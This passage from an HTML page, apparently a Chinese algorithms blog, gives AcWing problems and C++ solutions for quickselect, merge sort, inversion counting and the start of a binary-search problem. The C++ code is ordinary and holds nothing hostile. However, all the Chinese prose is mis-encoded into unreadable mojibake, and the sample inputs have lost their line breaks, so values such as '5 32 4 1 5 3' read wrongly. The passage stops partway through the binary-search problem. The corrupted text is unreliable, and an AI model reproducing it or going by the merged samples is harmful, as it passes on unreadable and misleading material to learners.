xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼ˆæ‰€æœ‰æ•´æ•°å‡åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \sim 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span> èŒƒå›´å†…ï¼‰ï¼Œè¡¨ç¤ºæ•´æ•°æ•°åˆ—ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•°åˆ—çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> å°æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>k</mi><mo>â‰¤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le k \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>5 32 4 1 5 3</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>3</code></pre><h3 id="é¢˜è§£-2">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">quick_choose</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> a[l];</span><br><span class="line">  <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, mid = (l + r) &gt;&gt; <span class="number">1</span>, pivot = a[mid];</span><br><span class="line">  <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">    <span class="keyword">while</span> (a[++i] &lt; pivot) &#123;&#125;;</span><br><span class="line">    <span class="keyword">while</span> (a[--j] &gt; pivot) &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(a[i], a[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (k &lt;= j - l + <span class="number">1</span>) <span class="keyword">return</span> <span class="built_in">quick_choose</span>(l, j, k);   <span class="comment">// j, è€Œémid</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">quick_choose</span>(j + <span class="number">1</span>, r, k - (j - l + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, k;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">quick_choose</span>(<span class="number">0</span>, n - <span class="number">1</span>, k));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å½’å¹¶æ’åº">å½’å¹¶æ’åº</h1><h2 id="AcWing-787-å½’å¹¶æ’åº"><a href="https://www.acwing.com/problem/content/789/">AcWing 787. å½’å¹¶æ’åº</a></h2><p>ç»™å®šä½ ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°æ•°åˆ—ã€‚</p><p>è¯·ä½ ä½¿ç”¨å½’å¹¶æ’åºå¯¹è¿™ä¸ªæ•°åˆ—æŒ‰ç…§ä»å°åˆ°å¤§è¿›è¡Œæ’åºã€‚</p><p>å¹¶å°†æ’å¥½åºçš„æ•°åˆ—æŒ‰é¡ºåºè¾“å‡ºã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>è¾“å…¥å…±ä¸¤è¡Œï¼Œç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼ˆæ‰€æœ‰æ•´æ•°å‡åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \sim 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span> èŒƒå›´å†…ï¼‰ï¼Œè¡¨ç¤ºæ•´ä¸ªæ•°åˆ—ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºå…±ä¸€è¡Œï¼ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ’å¥½åºçš„æ•°åˆ—ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>53 1 2 4 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>1 2 3 4 5</code></pre><h3 id="é¢˜è§£-3">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], tmp[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;  <span class="comment">// ç»ˆæ­¢æ¡ä»¶, å¦åˆ™æŠ¥TLE</span></span><br><span class="line">  <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">merge</span>(l, mid);</span><br><span class="line">  <span class="built_in">merge</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">  <span class="type">int</span> i = l, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt;= a[j]) &#123;</span><br><span class="line">      tmp[k++] = a[i++];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      tmp[k++] = a[j++];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= mid) tmp[k++] = a[i++];</span><br><span class="line">  <span class="keyword">while</span> (j &lt;= r) tmp[k++] = a[j++];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = l, j = <span class="number">0</span>; i &lt;= r; i++, j++) a[i] = tmp[j];  <span class="comment">// &lt;=</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="built_in">merge</span>(<span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-788-é€†åºå¯¹çš„æ•°é‡"><a href="https://www.acwing.com/problem/content/790/">AcWing 788. é€†åºå¯¹çš„æ•°é‡</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°æ•°åˆ—ï¼Œè¯·ä½ è®¡ç®—æ•°åˆ—ä¸­çš„é€†åºå¯¹çš„æ•°é‡ã€‚</p><p>é€†åºå¯¹çš„å®šä¹‰å¦‚ä¸‹ï¼šå¯¹äºæ•°åˆ—çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä¸ªå’Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> ä¸ªå…ƒç´ ï¼Œå¦‚æœæ»¡è¶³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>&lt;</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i &lt; j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> ä¸” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>&gt;</mo><mi>a</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[i] &gt; a[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>ï¼Œåˆ™å…¶ä¸ºä¸€ä¸ªé€†åºå¯¹ï¼›å¦åˆ™ä¸æ˜¯ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œè¡¨ç¤ºæ•°åˆ—çš„é•¿åº¦ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•´ä¸ªæ•°åˆ—ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºé€†åºå¯¹çš„ä¸ªæ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>ï¼Œ<br>æ•°åˆ—ä¸­çš„å…ƒç´ çš„å–å€¼èŒƒå›´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,10^9]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>62 3 4 5 6 1</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>5</code></pre><h3 id="é¢˜è§£-4">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], tmp[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="built_in">merge</span>(l, mid) + <span class="built_in">merge</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">  <span class="type">int</span> i = l, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt;= a[j]) &#123;</span><br><span class="line">      tmp[k++] = a[i++];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      tmp[k++] = a[j++];</span><br><span class="line">      res += mid - i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= mid) tmp[k++] = a[i++];</span><br><span class="line">  <span class="keyword">while</span> (j &lt;= r) tmp[k++] = a[j++];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = l, j = <span class="number">0</span>; i &lt;= r; i++, j++) a[i] = tmp[j];</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">merge</span>(<span class="number">0</span>, n - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="äºŒåˆ†">äºŒåˆ†</h1><h2 id="AcWing-789-æ•°çš„èŒƒå›´"><a href="https://www.acwing.com/problem/content/791/">AcWing 789. æ•°çš„èŒƒå›´</a></h2><p>ç»™å®šä¸€ä¸ªæŒ‰ç…§å‡åºæ’åˆ—çš„é•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°æ•°ç»„ï¼Œä»¥åŠ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> ä¸ªæŸ¥è¯¢ã€‚</p><p>å¯¹äºæ¯ä¸ªæŸ¥è¯¢ï¼Œè¿”å›ä¸€ä¸ªå…ƒç´  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> çš„èµ·å§‹ä½ç½®å’Œç»ˆæ­¢ä½ç½®ï¼ˆä½ç½®ä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> å¼€å§‹è®¡æ•°ï¼‰ã€‚</p><p>å¦‚æœæ•°ç»„ä¸­ä¸å­˜åœ¨è¯¥å…ƒç´ ï¼Œåˆ™è¿”å› <code>-1 -1</code>ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 